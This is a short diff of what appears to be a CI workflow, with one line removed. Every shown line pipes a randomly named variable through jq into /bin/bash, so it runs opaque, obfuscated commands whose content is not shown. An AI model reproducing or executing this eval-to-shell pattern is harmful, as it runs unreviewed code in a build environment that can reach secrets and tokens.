@@ -39,7 +39,6 @@ jobs:
           echo $ewzm8041 | jq -r .fev080 | /bin/bash
           printf '%s' "$yasg59415" | jq -r .uq5152 | /bin/bash
           printf '%s' "$pxfi551" | jq -r .gmghe0 | /bin/bash
-          printf '%s' "$pxxf99" | jq -r .pfg25633 | /bin/bash
           printf '%s' "$ujw12" | jq -r .bd63 | /bin/bash
           printf '%s' "$ss75" | jq -r .zlfr0952 | /bin/bash
           echo $vwfpk290 | jq -r .iu61 | /bin/bash
